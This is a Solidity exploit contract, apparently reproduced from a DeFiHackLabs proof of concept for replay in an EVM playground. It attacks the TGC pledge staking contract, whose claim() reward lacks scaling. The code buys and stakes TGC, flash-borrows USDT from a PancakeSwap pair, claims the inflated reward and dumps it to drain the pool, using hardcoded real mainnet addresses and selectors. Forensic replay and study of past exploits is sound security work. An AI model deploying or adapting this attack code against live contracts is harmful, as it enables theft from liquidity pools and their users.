// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-05-TGC).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// contract (the flash-swap callback `pancakeCall` lives on the test itself, and
// `address(this)` IS the attacker), so there is no standalone contract to
// deploy. This contract is a faithful, self-contained copy of that inline
// attack (attack() + pancakeCall() + swap_token_to_token() + approveAll())
// so the playground can deploy it and record attack(). Logic and constants
// are copied verbatim from test/TGC_exp.sol.
//
// Root cause: the TGC "pledge" staking contract's claim() reward formula is
// unscaled — it pays roughly `principal * elapsedSeconds * ~6.3` TGC with no
// 1e18 fixed-point divisor and no per-year normalization. Staking 100 TGC and
// waiting 5 hours mints ~11.36M TGC (≈1.1% of total supply) from the
// contract's pre-funded treasury, which the attacker dumps into the thin
// TGC/USDT PancakeSwap pool to drain its USDT reserve.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract TGCDrain {
    IUniPairV2 private constant Pair = IUniPairV2(0xBb33668bAe76A6394683DeEf645487e333b8fC45);
    IUniRouterV2 private constant Router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 private constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant TGC = IERC20(0x523aA213FE806778Ffa597b6409382fFfcc12De2);
    address private constant vulnContract = 0x32F9188d6D86Bf88dbAc3ceEe5958aDf1aa609df;

    // The original test does buy -> joinPledge -> vm.warp(+5h) -> flash-swap ->
    // claim(), all inside ONE transaction, using Foundry's mid-call vm.warp to
    // jump the clock forward AFTER recording the pledge. The in-browser replay
    // has only a single, whole-replay block.timestamp override
    // (config setup.blockTimestamp), so the buy+joinPledge step is done
    // UNRECORDED in config setup (see poc-configs/2024-05-TGC.mjs) while the
    // timestamp is still the original fork timestamp, then a setup.storeSlot
    // patches the pledge's stored join-timestamp back to that original value,
    // and setup.blockTimestamp jumps the WHOLE replay's clock forward 5 hours
    // before this recorded attack() runs — reproducing the same 18,000s elapsed
    // window claim() sees, with the buy/joinPledge no longer part of the trace.
    //
    // step 4-7 (recorded): flash-borrow 29,809 USDT from the pair, which
    // triggers pancakeCall() -> claim() the inflated reward, repay the loan.
    // step 8 (recorded): dump the freshly-minted TGC reward back into USDT.
    function attack() external {
        Pair.swap(0, 29_809 ether, address(this), new bytes(0x31));
        swap_token_to_token(address(TGC), address(USDT), TGC.balanceOf(address(this)));
    }

    // Unrecorded helper called from config setup (as "exploit") to perform the
    // buy + joinPledge steps before the replay's clock is jumped forward.
    function joinPledgeSetup() external {
        swap_token_to_token(address(USDT), address(TGC), 100 ether);
        approveAll();
        vulnContract.call(abi.encodeWithSelector(bytes4(0x836aefb0), 100_000_000_000_000_000_000));
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        vulnContract.call(abi.encodeWithSelector(bytes4(0xfd5a466f)));
        USDT.transfer(address(Pair), 29_809 ether);
        TGC.transfer(address(Pair), 80 ether);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    function approveAll() internal {
        TGC.approve(vulnContract, type(uint256).max);
    }
}
